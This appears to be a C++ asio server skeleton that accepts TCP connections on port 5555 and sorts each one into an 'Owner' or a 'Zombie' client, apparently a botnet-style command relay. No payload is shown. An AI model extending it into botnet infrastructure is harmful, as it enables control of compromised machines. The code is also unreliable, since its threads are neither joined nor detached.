#include <asio.hpp>
#include <asio/ip/tcp.hpp>
#include <thread>
#include "Client.h"
typedef asio::ip::tcp tcp;

void work(tcp::socket&& socket)
{
	bool mode;
	size_t read = 0;
	std::unique_ptr<Client> c;
	while (read != sizeof(bool))
	{
		read += asio::read(socket, asio::buffer(&mode, sizeof(bool)));
	}
	if (mode)
	{
		c = std::make_unique<Owner>(socket);
	}
	else
	{
		c = std::make_unique<Zombie>(socket);
	}
}

int main()
{
	asio::io_context context;
	tcp::acceptor acceptor(context, tcp::endpoint(tcp::v4(), 5555));
	while (true)
	{
		tcp::socket socket(context);
		acceptor.accept(socket);
		std::thread t(work, std::move(socket));
	}
	return 0;
}